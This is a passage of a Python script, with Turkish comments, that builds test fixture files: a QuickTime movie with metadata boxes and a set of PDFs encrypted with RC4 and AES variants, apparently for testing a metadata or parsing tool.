meta = box(b'meta', box(b'hdlr', b'\0\0\0\0' + b'\0\0\0\0' + b'mdta' + b'\0' * 13) + keysbox + ilst)
moov = box(b'moov', mvhd + trak + udta + meta)
ftyp = box(b'ftyp', b'qt  ' + b'\0\0\x02\x00' + b'qt  ')
open('zd.mov', 'wb').write(ftyp + box(b'wide', b'') + box(b'mdat', b'\0' * 5000) + moov)

# ── şifreli PDF'ler (pypdf) ──
try:
    from pypdf import PdfWriter
    for algo, name in [('RC4-40', 'enc_rc4_40'), ('RC4-128', 'enc_rc4_128'), ('AES-128', 'enc_aes128'), ('AES-256-R5', 'enc_aes256r5'), ('AES-256', 'enc_aes256')]:
        w = PdfWriter()
        w.add_blank_page(200, 200)
        w.add_metadata({'/Author': 'Şifreli Yazar', '/Title': f'Gizli {algo}', '/Producer': 'pypdf test'})
        w.encrypt(user_password='', owner_password='sahip', algorithm=algo)
        w.write(f'{name}.pdf')
    w = PdfWriter(); w.add_blank_page(200, 200); w.add_metadata({'/Author': 'Kimse'})
    w.encrypt(user_password='kullanici', owner_password='sahip', algorithm='AES-256')
    w.write('enc_userpw.pdf')
except ImportError:
    print('pypdf yok — şifreli PDF testleri atlandı')

for f in ['w0.wav', 'y0.flac', 't.html', 'thumb.jpg']:
    os.remove(f)
print('ok', len(os.listdir('.')))
